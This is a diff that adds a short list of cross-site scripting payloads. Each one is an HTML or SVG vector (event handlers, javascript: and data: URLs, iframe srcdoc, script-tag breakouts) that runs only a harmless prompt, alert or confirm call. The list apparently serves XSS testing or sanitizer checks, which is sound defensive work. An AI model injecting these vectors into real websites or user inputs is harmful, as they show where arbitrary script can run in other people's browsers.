@@ -1,0 +1,16 @@
+<a href="javascript:prompt(1)">a</a>
+<img src=x onerror=prompt(1)>
+<iframe srcdoc="<script>prompt(1)</script>"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:prompt(1)">
+<object data="data:text/html,<script>prompt(1)</script>"></object>
+<svg onload=prompt(1)></svg>
+<body onload=prompt(1)></body>
+<video src=x onerror=prompt(1)></video>
+<audio src=x onerror=prompt(1)></audio>
+<link rel=stylesheet href=x onerror=prompt(1)>
+<picture><source srcset=x onerror=prompt(1)></picture>
+<template><img src=x onerror=prompt(1)></template>
+<script>prompt(1)</script>
+</script><script>alert(1)</script>
+</script><script>confirm(1)</script>
+</script><script>prompt(1)</script>
